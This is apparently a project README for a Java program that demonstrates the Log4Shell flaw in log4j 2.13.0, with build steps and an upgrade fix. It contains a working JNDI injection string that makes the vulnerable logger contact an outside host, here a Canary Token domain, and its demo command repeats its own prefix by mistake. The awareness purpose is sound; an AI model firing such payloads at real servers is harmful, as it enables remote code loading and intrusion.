# log4j-exploit

This program simulate and demo the log4Shell (log4j Vulnerability) exploit.
The program receives command line argument. Log the command argument on console using log4j version 2.13.0 which is the vulnerable version as per [Apache Log4j website](https://logging.apache.org/log4j/2.x/security.html) 

## Steps to Run this Program.

- Clone this repository
- cd to repo directory
- Run maven command to compile and build the jar <br>
	`mvn install`
- cd to target directory
- Run jar with dependencies with command line parameter <br>
	`java -jar log4j-exploit-0.0.1-SNAPSHOT-jar-with-dependencies.jar hello-log4j`	
- Above command should echo the command line parameter and prints output as which looks like
```
10:45:30.223 [main] INFO  Main - ############ Entered log4j exploit ###########
10:45:30.227 [main] INFO  Main - Received input: hello-log4j
10:45:30.227 [main] INFO  Main - ############ Exit log4j exploit ###########

```

## Steps to Simulate Vulnerability Exploit

```
logger.info("Received input: {}", input);
```
- Above API call is vulnerable to JNDI Lookup attack. To simulate the attack, go to 
[Canary Tokens Portal](https://canarytokens.org/generate) and generate a "DNS Token" by providing your personal email address. If somebody tries to access the fake DNS created by Canary Tokens, an alert email is sent to the personal email address registered during creation of the token.

- To exploit the vulnerability, run following command with JNDI attack payload
`java -jar log4j-exploit-0.0.1-SNAPSHOT-jar-with-dependencies.jar java -jar log4j-exploit-0.0.1-SNAPSHOT-jar-with-dependencies.jar '${jndi:ldap://<canary-token>.canarytokens.com/a}'` <br>

Disclaimer: This program is intended to demo log4j vulnerability to spread awareness among developers so that developers can understand and mitigate the risk associated with their applications. The knowledge should be used for ethical purpose only. 
- When above command is run, you should notice following events
	- The program prints line as `[main] INFO  Main - ############ Entered log4j exploit ###########` and hangs for few seconds. This indicates log4j logging API has an issue
	- You will receive an alert email from canary tokens informing about somebody tried to access the fake domain you have created in first step. This indicates your log4j API instead of logging the argument tried to access the domain provided as part of argument. This is a serious issue.
	
Note: To fix this vulnerability. Just upgrade log4j library versions to 2.17.0 in pom.xml	
	


	
